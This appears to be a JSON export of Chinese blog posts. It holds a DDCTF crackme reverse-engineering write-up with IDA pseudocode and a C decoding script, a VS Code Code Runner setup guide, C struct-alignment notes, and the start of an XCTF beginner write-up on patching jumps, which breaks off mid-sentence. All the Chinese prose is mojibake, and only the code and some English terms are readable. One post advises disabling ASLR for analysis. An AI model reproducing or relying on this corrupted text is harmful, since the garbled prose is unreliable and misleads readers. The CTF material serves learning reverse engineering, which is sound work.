ä¸ºæœ‰å®ƒçš„å­˜åœ¨æ¯æ¬¡odè½½å…¥æ—¶ï¼Œå…¶æ˜ åƒåŸºå€éƒ½æ˜¯ä¼šå˜åŒ–çš„ï¼Œè€Œä½ æœ‰æ—¶å€™éœ€è¦è®¡ç®—ä¸€äº›åœ°å€ï¼ŒåŸºå€è€æ˜¯å˜ã€‚ä»¥å‰æˆ‘æ˜¯ä¸çŸ¥é“è¿™ä¸ªçš„ï¼ŒçŸ¥é“ä»¥åæ„Ÿè§‰è¿™ä¸ªæ˜¯æ›´åŠ åˆ©äºå¯¹ç¨‹åºçš„åˆ†æï¼Œå°±æƒ³ç€ç›´æ¥å…³é—­windows7çš„ASLRã€‚ å…³é—­ASLRæœ‰ä¸¤ç§åŠæ³•ã€‚ æ”¹æ³¨å†Œè¡¨æ³¨å†Œè¡¨æ·»åŠ äº†ä¸€ä¸ªDWORDé”®å€¼é¡¹ï¼Œå…¶å€¼ä¸º0ã€‚æ³¨æ„å…¶åç§°å’Œè·¯å¾„ã€‚ è½¯ä»¶å…³é—­ä¸‹è½½EMETï¼šhttps://www.updatestar.com/directdownload/emet/2258274å…³é—­åé‡å¯å³å¯ã€‚ æˆåŠŸè¿è¡Œç¨‹åºæˆåŠŸè¿è¡Œåå‘ç°ï¼šè¿™ä¸ªä¼°è®¡åˆæ˜¯å­—ç¬¦å¯¹æ¯”ã€‚ç”¨IDAæ‰“å¼€åˆ†æå…¶é€»è¾‘ã€‚ IDAé™æ€åˆ†æä¸»å‡½æ•°int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-804h] char v5; // [esp+5h] [ebp-803h] char v6; // [esp+404h] [ebp-404h] char Dst; // [esp+405h] [ebp-403h] v6 = 0; memset(&amp;Dst, 0, 0x3FFu); v4 = 0; memset(&amp;v5, 0, 0x3FFu); printf(&quot;please input code:&quot;); scanf(&quot;%s&quot;, &amp;v6); sub_401000(&amp;v6); if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) ) printf(&quot;You&apos;ve got it!!%s\\n&quot;, &amp;v4); else printf(&quot;Try again later.\\n&quot;); return 0; }ä»£ç å¾ˆç®€å•ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æ¥å—è¾“å…¥åï¼Œç»è¿‡sub_401000å‡½æ•°åˆ†å¤„ç†åä¸DDCTF{reverseME}å¯¹æ¯”ï¼Œæ­£ç¡®å°±è¾“å‡ºYouâ€™ve got it!ã€‚ å¤„ç†å‡½æ•°sub_401000unsigned int __cdecl sub_401000(const char *a1) { _BYTE *v1; // ecx unsigned int i; // edi unsigned int result; // eax const char *v4; // ebx i = 0; result = strlen(a1); if ( result ) { v4 = (a1 - v1); do { *v1 = byte_402FF8[v1[v4]]; ++i; ++v1; result = strlen(a1); } while ( i &lt; result ); } return result; }å¯ä»¥çœ‹å‡ºæ¥è¾“å…¥çš„ä¸œè¥¿çš„ç¡®åœ¨è¿™é‡Œè¿›è¡Œäº†ï¼Œä¸€ä½ä½çš„å¤„ç†ã€‚ç”¨è¿™é‡Œçš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ›¿æ¢ã€‚ä½†æ˜¯è·³è½¬æŸ¥çœ‹å‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå‘ç°æœ€ä¸‹æ–¹ä¸€æ®µä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨çš„å­—ç¬¦ä¸²ã€‚é™æ€åˆ†æè‡³æ­¤ï¼Œæ²¡ä»€ä¹ˆæ€è·¯äº†ã€‚ç”¨odæ¥çœ‹çœ‹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå˜æˆä»€ä¹ˆæ ·ã€‚ ODåŠ¨æ€åˆ†æå®šä½åœ¨è¿™ä¸ªå­—ç¬¦ä¸²ä¹‹å‰åº”è¯¥å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥åè¢«å¤„ç†åçš„å­—ç¬¦ä¸²ã€‚åœ¨å‰é¢ä¸€ä¸ªå‡½æ•°è¿›è¡Œä¸‹æ–­ç‚¹ï¼Œä¹Ÿå¯ä»¥æ¸…æ¥šçœ‹åˆ°ä»–å°±æ˜¯æˆ‘ä»¬åˆšåˆšè¯´çš„åŠ å¯†å‡½æ•°è¿™å°±æ˜¯ä¸€ä¸ªåœ°å€ã€‚ç„¶åæˆ‘ä»¬è¾“å…¥123æµ‹è¯•å·²ç»ç©¿è¿›eaxã€‚ç›´æ¥F8ä¸è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„å°±çœ‹æ€ä¹ˆå¤„ç†äº†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚å‘ç°å˜æˆäº†mlkã€‚æŸ¥çœ‹ä¸‹å¯¹åº”çš„ASCIL:å¯ä»¥æ˜æ˜¾å‘ç°å¤„ç†å‰çš„å­—ç¬¦ä¸å¤„ç†åçš„å­—ç¬¦ç›¸åŠ éƒ½ç­‰äº158ã€‚ è„šæœ¬è§£å¯†#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char arr[]=&quot;DDCTF{reverseME}&quot;; for (int i = 0; i &lt; strlen(arr); i++) { arr[i]=158-arr[i]; } printf(&quot;%s&quot;,arr); }%æ˜¯VCç¼–è¯‘çš„å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ä¸ç”¨ä»£å…¥ã€‚ æ€»ç»“åœ¨æŸåœ¨é¢˜ç›®ä¸­ï¼Œé™æ€åˆ†æåŠ å¯†å‡½æ•°æœ‰äº›å›°éš¾çš„æ—¶å€™ï¼Œå¾€å¾€æ²¡æœ‰åŠ¨æ€åˆ†ææ¥çš„å¿«ï¼Œæ„Ÿè§‰åŠ¨é™ç»“åˆåˆ†ææ˜¯å¾ˆå¥½çš„ã€‚","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"http://chumen77.xyz/tags/Re/"}]},{"title":"Vscodeçš„ç®€å•è°ƒæ•™","slug":"Vs codeçš„ç®€å•è°ƒæ•™","date":"2019-11-15T02:55:26.000Z","updated":"2020-02-28T07:53:02.000Z","comments":true,"path":"2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/","link":"","permalink":"http://chumen77.xyz/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/","excerpt":"","text":"Vscodeçš„ç®€å•è°ƒæ•™å‰è¨€VScodeæ˜¯æ¯”è¾ƒé€‚åˆè‡ªå·±ä½¿ç”¨çš„ï¼Œå› ä¸ºéå¸¸çš„ç®€æ´ä¸”ä¸è‡ƒè‚¿ï¼Œæ‹“å±•æ€§è¿˜å¥½ã€‚å¹¶ä¸”è‡ªå·±å¸¸å†™ä»£ç æ˜¯å°±æ˜¯ä¸ºäº†è¾“å…¥è¾“å‡ºå®ç°æŸäº›åŠŸèƒ½ï¼ŒåŸºæœ¬ç”¨ä¸åˆ°è°ƒè¯•åŠŸèƒ½ã€‚ä½†ç¢äºéš¾ä»¥é…ç½®å„ç§ç¯å¢ƒï¼Œä¸€ç›´æ²¡æœ‰ç”¨ä¸Šï¼Œå¤±è´¥äº†å¾ˆå¤šæ¬¡ã€‚ç°åœ¨åˆå­¦ç€æ•´äº†ä¸€ä¸‹ï¼Œç°åœ¨å·²ç»åƒä¸Šäº†vscodeçš„é¦™ã€‚å†™ä¸ªåšå®¢ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥åˆ†æä¸‹ç»éªŒã€‚ æ­£å¸¸è®¾ç½® åœ¨è¿™é‡Œç‚¹å‡»å®Œè®¾ç½®ä»¥åï¼Œä¼šå‡ºç°ï¼šåœ¨è¿™é‡Œå¯ä»¥è®¾ç½®vscodeçš„å„ç§åœ°æ–¹ï¼Œå°±å¦‚å›¾ä¸­ä¸€æ ·ï¼Œéœ€è¦è‡ªå·±æ¢ç´¢ä¸€ä¸‹ï¼Œç„¶åè®¾ç½®æˆè‡ªå·±æƒ³è¦çš„ç»“æœã€‚ é…ç½®ç¼–è¯‘ç¯å¢ƒè¿™é‡Œæˆ‘åªç”¨åˆ°c/c++å’ŒPythonå°±åªè®°å½•è¿™ä¸ªäº†ã€‚è¾“å…¥C/C++åœ¨è¿™é‡Œè¿›è¡Œç‚¹ä¸ªinstallã€‚PYthonä¹Ÿæ˜¯åŒæ ·çš„æ“ä½œã€‚ è®©ä»£ç è·‘èµ·æ¥åœ¨åº”ç”¨å•†åº—é‡Œæœç´¢Code Runnerã€‚è¿™ä¸ªæ˜¯ä¸ªç¥å™¨ï¼Œæœ‰äº†å®ƒå°±å¯ä»¥åœ¨vscodeç›´æ¥è¿è¡Œå„ç§ä»£ç ã€‚å®‰è£…å¥½åæŠŠvscodeå…³é—­ï¼Œç„¶åé‡æ–°æ‰“å¼€ã€‚ æ–°å»ºä¸ªC/C++æ–‡ä»¶ï¼šç„¶åå³é”®æ˜¯å¯ä»¥è¿è¡Œä»£ç çš„ã€‚åœ¨å³ä¸Šè§’ï¼šè¿™ä¸ªå°ä¸‰è§’ä¹Ÿå¯ä»¥è¿è¡Œä»£ç ã€‚çœ‹ä¸‹æ•ˆæœï¼š æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡ºæˆ‘ä»¬æ”¹ä¸€ä¸‹ä»£ç ï¼š #include int main() { int a; scanf(â€œ%dâ€,&amp;a); printf(â€œhello world!â€); } åœ¨è¿™æ ·ç›´æ¥è¿è¡Œåå‘ç°ï¼šå¡åœ¨è¿è¡Œè¿‡ç¨‹ä¸”æˆ‘ä»¬æ— æ³•è¾“å…¥ï¼šè¿™ä¸ªè§£å†³åŠæ³•å°±æ˜¯æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡ºå°±å¯ä»¥äº†ã€‚ç‚¹å‡»é…ç½®æ‰©å±•ä¿¡æ¯ã€‚ä¸‹æ»‘æ‰¾åˆ°ï¼šç„¶åæ‰“ä¸ªå‹¾å°±å¯ä»¥äº†ã€‚è¿è¡Œï¼šå‘ç°æˆåŠŸäº†ï¼Œç„¶åçœ‹ä¸‹å…¶åŸç†å°±æ˜¯å¸®ä½ å¯¹ç»ˆç«¯è¿›è¡Œäº†cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;testè¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œï¼Œå‘ç°å…¶æ˜¯ç”¨gccè¿›è¡Œäº†ç¼–è¯‘ï¼Œmacæ˜¯è‡ªå¸¦clangçš„ï¼Œclangçš„ä¼˜ç‚¹æŒºå¤šçš„ï¼Œä¸”æ”¯æŒè¯­æ³•é”™è¯¯çš„æ£€æµ‹ï¼Œç„¶åå°±æƒ³ç€å»æ”¹ä¸‹è®©å…¶ç”¨clang++æ¥ç¼–è¯‘ã€‚ è‡ªå®šä¹‰è¿è¡Œé€»è¾‘è¿˜æ˜¯è¿›å…¥è¿™ä¸ªé…ç½®é‡Œé¢ï¼šåœ¨settings.jsonä¸­ç¼–è¾‘: &quot;code-runner.executorMap&quot; : { &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;, &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;php&quot;: &quot;php&quot;, &quot;python&quot;: &quot;python -u&quot;, &quot;ruby&quot;: &quot;ruby&quot;, }æˆå“ï¼šç›´æ¥ç²˜è´´è¿™æ®µä»£ç æ”¾å…¥è¿™é‡Œé¢ä¿å­˜å°±å¯ä»¥äº†ã€‚ æ•ˆæœï¼šå®ç°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚ æµ‹è¯•ä¸€ä¸‹Pythonè¿™æ˜¯ç›´æ¥æ–°å»ºçš„ï¼šè¿™æ ·å°±å¯ä»¥ä¸€ä¸ªvscodeè¿è¡Œå„ç§ä»£ç ï¼Œå¯¹äºä¸æ˜¯ä¸“é—¨åšå¼€å‘ï¼Œåªæ˜¯å†™è„šæœ¬çš„ï¼Œå°±æ˜¯ä¸ªç¦éŸ³ã€‚","categories":[],"tags":[{"name":"vscode","slug":"vscode","permalink":"http://chumen77.xyz/tags/vscode/"}]},{"title":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰","slug":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰","date":"2019-11-12T12:18:49.000Z","updated":"2020-02-28T07:53:37.000Z","comments":true,"path":"2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/","link":"","permalink":"http://chumen77.xyz/2019/11/12/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰/","excerpt":"","text":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰å‰è¨€ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­è®¤ä¸ºå®¹æ˜“å¿˜è®°ä¸”é‡è¦çš„ä¸œè¥¿ï¼Œæ–¹ä¾¿ä»¥åå¿˜äº†å†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚é›†ä¸­äºç»“æ„ä½“éƒ¨åˆ†ä»¥åŠç»“æ„ä½“å¯¹é½çš„çŸ¥è¯†ã€‚ ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ 1ã€å®šä¹‰ä¸€ä¸ªç»“æ„ä½“Gamerç”¨æ¥å­˜å‚¨ä¸€ä¸ªæ¸¸æˆä¸­çš„è§’è‰²çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡€å€¼ã€ç­‰çº§ã€åæ ‡ç­‰ä¿¡æ¯ ã€‚è¦æ±‚ï¼š (1) å…·ä½“åŒ…å«å“ªäº›ä¿¡æ¯è‡ªç”±è®¾è®¡ (2) ä½†è¿™äº›åŒ…å«çš„ç±»å‹ä¸­ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæˆå‘˜æ˜¯ç»“æ„ä½“ç±»å‹ã€‚ 2ã€å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥ç»™è¿™ä¸ªç»“æ„ä½“å˜é‡èµ‹å€¼.3ã€å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥æ˜¾ç¤ºè¿™ä¸ªç»“æ„ä½“å˜é‡çš„æ‰€æœ‰æˆå‘˜ä¿¡æ¯. #include #include &lt;stdio.h&gt; #include &lt;string.h&gt; struct point { int x; int y; int z; }; struct Gamer { char name[20]; int level; float HP; point a; }No1; void Function() { char a[]=â€xiaozhiâ€; for (int i = 0; i &lt;strlen(a) ; ++i) { No1.name[i]=a[i]; } No1.level = 99; No1.HP = 99.9; No1.a.x=6; No1.a.y=5; No1.a.z=9; } void Display() { printf(â€œname:%s level:%d HP:%f point:%d %d %d â€œ,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z); } int main() { Function(); Display(); return 0; } sizeofçš„ä½¿ç”¨åŸºæœ¬ç±»å‹çš„sizeofå¯ä»¥ä½¿ç”¨ç±»å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å˜é‡ä¾‹å­ï¼š printf(â€œ%d\\nâ€,sizeof(char));printf(â€œ%d\\nâ€,sizeof(int));printf(â€œ%d\\nâ€,sizeof(float));printf(â€œ%d\\nâ€,sizeof(double)); int x = 10; //å˜é‡printf(â€œ%d\\nâ€,sizeof(x)); æ•°ç»„ç±»å‹çš„sizeofä¾‹å­ï¼š char arr1[10] = {0}; short arr2[10] = {0}; int arr3[10] = {0}; printf(&quot;%d\\n&quot;,sizeof(arr1)); //10 printf(&quot;%d\\n&quot;,sizeof(arr2)); // 20 printf(&quot;%d\\n&quot;,sizeof(arr3)); // 40 printf(&quot;%d\\n&quot;,sizeof(arr1[10])); // 1 printf(&quot;%d\\n&quot;,sizeof(arr2[10])); // 2 printf(&quot;%d\\n&quot;,sizeof(arr3[10])); //4æ³¨æ„å…¶ä¸­çš„ä¸åŒã€‚ ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿæœ¬è´¨ï¼šæ˜¯è¦æ•ˆç‡è¿˜æ˜¯ç©ºé—´ï¼ŒäºŒé€‰ä¸€çš„ç»“æœ.ç»Ÿç§°æ˜¯æ€§èƒ½ï¼Œè¿˜æœ‰å°ç§»æ¤ç­‰å› ç´ ï¼Œç¼–è¯‘å™¨å¯¹æ•°æ®ç»“æ„è¿›è¡Œäº†å†…å­˜å¯¹é½ã€‚ pragma packçš„åŸºæœ¬ç”¨æ³•åœ¨vc6.0++ä¸­é»˜è®¤å€¼æ˜¯8å­—èŠ‚å¯¹é½ã€‚ #pragma pack( n ) ç»“æ„ä½“ã€‚ #pragma pack( )è¯¥æ“ä½œä¼šæ”¹å˜ä¸€ä¸ªç»“æ„ä½“çš„å­—èŠ‚å¯¹é½æ•°ï¼Œè¿™æ˜¯é’ˆå¯¹ç¼–è¯‘å™¨çš„ã€‚å¯¹é½å‚æ•°ï¼šnä¸ºå­—èŠ‚å¯¹é½æ•°ï¼Œå…¶å–å€¼ä¸º1ã€2ã€4ã€8ï¼Œé»˜è®¤æ˜¯8ã€‚å¦‚æœè¿™ä¸ªå€¼æ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œé‚£ä¹ˆè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†ï¼Œå³æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼. #pragma pack(n) struct Test { int a ; __int64 b ; char c ; }; #pragma pack() ä»¥ä¸‹æ˜¯å„ç§æƒ…å†µçš„å†…å­˜å¯¹é½åˆ†æ:1:1å­—èŠ‚å¯¹é½2:2å­—èŠ‚å¯¹é½æ—¶ï¼š3ï¼š4ä¸ªå­—èŠ‚å¯¹é½4ã€8ä¸ªå­—èŠ‚å¯¹é½ å¯¹é½åŸåˆ™ï¼šåŸåˆ™ä¸€ï¼šæ•°æ®æˆå‘˜å¯¹é½è§„åˆ™ï¼šç»“æ„çš„æ•°æ®æˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æˆå‘˜æ”¾åœ¨offsetä¸º0çš„åœ°æ–¹ï¼Œä»¥åæ¯ä¸ªæ•°æ®æˆå‘˜å­˜å‚¨çš„èµ·å§‹ä½ç½®è¦ä»è¯¥æˆå‘˜å¤§å°çš„æ•´æ•°å€å¼€å§‹(æ¯”å¦‚intåœ¨32ä½æœºä¸ºï¼”å­—èŠ‚ï¼Œåˆ™è¦ä»4çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨). åŸåˆ™äºŒï¼šç»“æ„ä½“çš„æ€»å¤§å°ï¼Œä¹Ÿå°±æ˜¯sizeofçš„ç»“æœï¼Œå¿…é¡»æ˜¯å…¶å†…éƒ¨æœ€å¤§æˆå‘˜çš„æ•´æ•°å€ï¼Œä¸è¶³çš„è¦è¡¥é½ã€‚åŸåˆ™ä¸‰ï¼šå¦‚æœä¸€ä¸ªç»“æ„é‡Œæœ‰æŸäº›ç»“æ„ä½“æˆå‘˜ï¼Œåˆ™ç»“æ„ä½“æˆå‘˜è¦ä»å…¶å†…éƒ¨æœ€å¤§å…ƒç´ å¤§å°çš„æ•´æ•°å€åœ°å€å¼€å§‹å­˜å‚¨ã€‚ (struct aé‡Œå­˜æœ‰struct bï¼Œbé‡Œæœ‰charï¼Œintï¼Œdoubleç­‰å…ƒç´ ï¼Œé‚£båº”è¯¥ä»8çš„æ•´æ•°å€å¼€å§‹å­˜å‚¨.) åŸåˆ™å››ï¼šå¯¹é½å‚æ•°å¦‚æœæ¯”ç»“æ„ä½“æˆå‘˜çš„sizeofå€¼å°ï¼Œè¯¥æˆå‘˜çš„åç§»é‡åº”è¯¥ä»¥æ­¤å€¼ä¸ºå‡†. ä¹Ÿå°±æ˜¯è¯´ï¼Œç»“æ„ä½“æˆå‘˜çš„åç§»é‡åº”è¯¥å–äºŒè€…çš„æœ€å°å€¼. ç”±æµ…å…¥æ·±ï¼Œåˆ†æå†…å­˜å¯¹é½åŸåˆ™åå†…å­˜åˆ°åº•æ˜¯æ€ä¹ˆåˆ†é…çš„ æ¡ˆä¾‹åˆ†æä¸€ï¼šstruct Test { char a; int b ; }; sizeof(Test) =1+3ï¼ˆè¡¥é½çš„ï¼‰+4=8(å…¶ä¸­æœ€å¤§çš„4çš„æ•´å€æ•°) æ¡ˆä¾‹äºŒåˆ†æï¼šstruct Test { int a ; __int64 b ; char c ; }; sizeof(Test) =4+4ï¼ˆè¡¥é½çš„ï¼‰+8+1+7ï¼ˆè¡¥é½çš„ï¼‰=24(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°) æ¡ˆä¾‹ä¸‰åˆ†æï¼šstruct Test { int a ; __int64 b ; char c ; char d ; }; sizeof(Test) =4+4ï¼ˆè¡¥é½çš„ï¼‰+8+1+1+6ï¼ˆè¡¥é½çš„ï¼‰=24(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°) æ¡ˆä¾‹å››åˆ†æï¼šstruct S1 { char c; double i; }; sizeof(S1) =1+7ï¼ˆè¡¥é½çš„ï¼‰+8=16(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°) æ¡ˆä¾‹äº”åˆ†æï¼šstruct S2 { int c1; char c2[10]; }; sizeof(S2) =4+10+2ï¼ˆè¡¥é½çš„ï¼‰=16(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°) æ¡ˆä¾‹å…­åˆ†æï¼šstruct S3 { char c1; S1 s; char c2; char c3; }; sizeof(S3) =1+7+1ï¼ˆsä¸­çš„char cï¼‰+7ï¼ˆè¡¥é½çš„ï¼‰+8ï¼ˆsä¸­çš„doubleï¼‰+1+1+6ï¼ˆè¡¥é½çš„ï¼‰=32(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°) æ¡ˆä¾‹ä¸ƒåˆ†æï¼šstruct S4 { char c1; S1 s; char c2; double c3; }; sizeof(S4) =1+7+1ï¼ˆsä¸­çš„char cï¼‰+7ï¼ˆè¡¥é½çš„ï¼‰+8ï¼ˆsä¸­çš„doubleï¼‰+1+7ï¼ˆè¡¥é½çš„ï¼‰+8=40(å…¶ä¸­æœ€å¤§çš„8çš„æ•´å€æ•°)","categories":[],"tags":[{"name":"cä¸æ±‡ç¼–","slug":"cä¸æ±‡ç¼–","permalink":"http://chumen77.xyz/tags/cä¸æ±‡ç¼–/"}]},{"title":"Xctf\\_REæ–°æ‰‹åŒºWP","slug":"Xctfre_æ–°æ‰‹åŒºwp","date":"2019-11-09T03:22:03.000Z","updated":"2020-02-28T07:55:24.000Z","comments":true,"path":"2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/","link":"","permalink":"http://chumen77.xyz/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/","excerpt":"","text":"Xctf_REæ–°æ‰‹åŒºWPå‰è¨€å­¦cä¸åæ±‡ç¼–å­¦çš„æœ‰ç‚¹ç–²å€¦äº†ï¼Œä¸”å®é™…è¿ç”¨æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æœ€è¿‘ä¸€å‘¨åˆ·äº†å¾ˆå¤šçš„Reå…¥é—¨é¢˜ï¼Œå·©å›ºçŸ¥è¯†ä¸”ç†Ÿæ‚‰ä¸‹ctfä¸­çš„REé¢˜ç›®ã€‚ re1ç¬¬ä¸€æ­¥ï¼Œå…ˆæŸ¥å£³ï¼šï¼ˆæŸ¥å£³å¾ˆé‡è¦ï¼Œå¯ä»¥å…ˆç¡®è®¤æ˜¯å¦æœ‰å£³è¿˜å¯ä»¥çŸ¥é“ç¨‹åºæ˜¯ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼‰çœ‹ä¸‹ç¨‹åºæ˜¯å¹²å˜›çš„ï¼Œä¹Ÿå°±æ˜¯ä½ è¾“å…¥flagç„¶åç¨‹åºå‡ºä¸ªåˆ¤æ–­æ˜¯å¦æ­£ç¡®ã€‚ä¼°è®¡å°±æ˜¯ä¸ªæ˜æ–‡å¯¹æ¯”ï¼Œç›´æ¥odæ‰“å¼€ï¼šæ–­åœ¨äº†reæ¨¡å—ã€‚ç›´æ¥æœç´¢å­—ç¬¦ä¸²æ‹¿åˆ°flag gameè¿˜æ˜¯å…ˆæŸ¥å£³ï¼šæ— å£³è¿™é“é¢˜æœ‰å¤šç§åšæ³•ï¼Œä¸‹é¢å±•ç¤ºä¸‰ç§ï¼š ç¬¬ä¸€ç§è¿™ä¸ªåšæ³•ä¸»è¦æ˜¯åˆ¤æ–­ç¨‹åºé€»è¾‘ï¼Œç„¶åæ”¹å…³é”®è·³è½¬çš„æ±‡ç¼–ä»£ç ï¼Œè¿›è¡Œçˆ†ç ´ç ´è§£ã€‚å…ˆçœ‹ä¸‹ç¨‹åºæ˜¯åšä»€ä¹ˆçš„ï¼šå…ˆè¾“å…¥ä¸ª1å‘ç°å›¾æ¡ˆä¸­ç¬¬1ï¼Œ2ï¼Œ8è¡Œå›¾å½¢å‘ç”Ÿäº†å˜åŒ–ã€‚æ¥ç€è¾“å…¥2ï¼Œç„¶åç¬¬3ï¼Œ4ï¼Œ8è¡Œå›¾å½¢å‘ç”Ÿäº†å˜åŒ–ã€‚æ„Ÿè§‰æ²¡ä»€ä¹ˆè§„å¾‹ï¼Œå¤§æ¦‚çŒœä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯è¿™8è¡Œçš„çº¿æ¡å…¨éƒ¨è¿é€šå°±å¯ä»¥å®Œæˆè¿™ä¸ªæ¸¸æˆã€‚ æ‰“å¼€IDAè¿›è¡Œé™æ€åˆ†æå‘ç°ä¸€å †å‡½æ•°éš¾ä»¥æ‰¾åˆ°ä¸»å‡½æ•°ï¼ŒæŒ‰shift+F12æŸ¥çœ‹å­—ç¬¦ä¸²ç‚¹å‡»è¿™ä¸ªï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨ï¼Œç„¶åå¯ä»¥åŒå‡»è·³è½¬åˆ°mainå‡½æ•°ï¼Œçœ‹æ•´ä¸ªç¨‹åºçš„é€»è¾‘ã€‚ è·³è½¬å¥½åæŒ‰F5æŸ¥çœ‹ä¼ªä»£ç ï¼šåœ¨ä¸‹æ–¹å‘ç°äº†ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œæ»¡è¶³åä¼šè°ƒç”¨sub_45Ab4è¿™ä¸ªå‡½æ•°ã€‚åŒå‡»è¿›å…¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼šå‘ç°ä¼šå‡ºç°è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åï¼šè¿˜ç»è¿‡ä¸€å †æ•°æ®å’Œå¼‚æˆ–åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚é‚£è¿™ä¸ªåº”è¯¥å°±æ˜¯è¿”å›flagäº†ã€‚é‚£å°±æ˜¯æƒ³åŠæ³•è®©ç¨‹åºè°ƒç”¨sub_45Ab4è¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ã€‚å†çœ‹ä¸€ä¸‹è¿™ä¸ªifè¯­å¥é‡Œé¢æ­£å¥½æ˜¯å¯¹ä¸€ä¸ªå®¹é‡ä¸º8çš„æ•°ç»„è¿›è¡Œåˆ¤æ–­ï¼Œå¯¹åº”åˆšåˆšç¨‹åºä¸­çš„8è¡Œï¼Œæ­£å¥½å¯¹åº”å½“8è¡Œç›´çº¿å…¨éƒ¨è¿æ¥ï¼ˆä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯å›¾æ¡ˆå…¨å˜ï¼‰å°±ä¼šè°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ã€‚ é‚£ç°åœ¨éœ€è¦åšçš„å°±å¾ˆæ˜ç¡®çš„ï¼Œç›´æ¥æ”¹ç¨‹åºæµç¨‹ï¼ŒIDAçš„patchæ˜¯å¯ä»¥åšåˆ°çš„ï¼Œç»“åˆåˆšåˆšæˆ‘ä»¬è¾“å…¥1çš„æ—¶å€™å›è®©1ï¼Œ2ï¼Œ8è¡Œè¿›è¡Œæ”¹å˜ï¼Œé‚£æˆ‘ä»¬å°±åœ¨è¿™å‡ å¤„åšæ”¹å˜å°±å¯ä»¥äº†ã€‚ IDA Patchçœ‹ä¸»å‡½æ•°çš„æµç¨‹å›¾æ¨¡å¼ï¼Œä¸“é—¨æ‰¾è¿™ä¸ªè·³è½¬æŒ‡ä»¤JNZï¼Œæ•°ä¸€ä¸‹8ä¸ªå°±æ˜¯åˆšåˆšçš„8ä¸ªåˆ¤æ–­äº†ã€‚å¯¹åº”åˆšåˆšçš„æƒ³æ³•æˆ‘ä»¬åœ¨è¿™å‡ 